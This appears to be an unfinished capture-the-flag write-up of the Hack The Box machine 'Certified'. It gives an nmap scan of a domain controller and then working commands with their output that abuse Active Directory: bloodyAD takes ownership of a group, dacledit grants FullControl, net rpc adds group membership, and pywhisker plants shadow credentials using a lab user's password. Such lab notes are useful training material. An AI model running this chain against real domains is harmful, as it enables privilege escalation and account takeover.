
# Enumeration
## Nmap 

```bash
nmap -sV -sC 10.10.11.41 -v  --min-rate 1000 -Pn -T4 -p-
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 11:05:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:04:20
| Not valid after:  2105-05-23T21:04:20
| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258
|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea
|_ssl-date: 2025-08-03T11:06:41+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:04:20
| Not valid after:  2105-05-23T21:04:20
| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258
|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:04:20
| Not valid after:  2105-05-23T21:04:20
| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258
|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea
|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:04:20
| Not valid after:  2105-05-23T21:04:20
| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258
|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea
|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-03T11:06:04
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

python3 bloodyAD.py  --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management judith.mader


```
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'


```
[*] DACL backed up to dacledit-20250803-071545.bak
[*] DACL modified successfully!
```

net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S "dc01.certified.htb" 

```
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" 
```

```
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 56f8749d-270a-9078-813b-876958ecf1bf
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 58SLNMUb.pfx
[+] PFX exportiert nach: 58SLNMUb.pfx
[i] Passwort für PFX: 0axzLWh7cg6d1speQvbf
[+] Saved PFX (#PKCS12) certificate & key at path: 58SLNMUb.pfx
[*] Must be used with password: 0axzLWh7cg6d1speQvbf
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
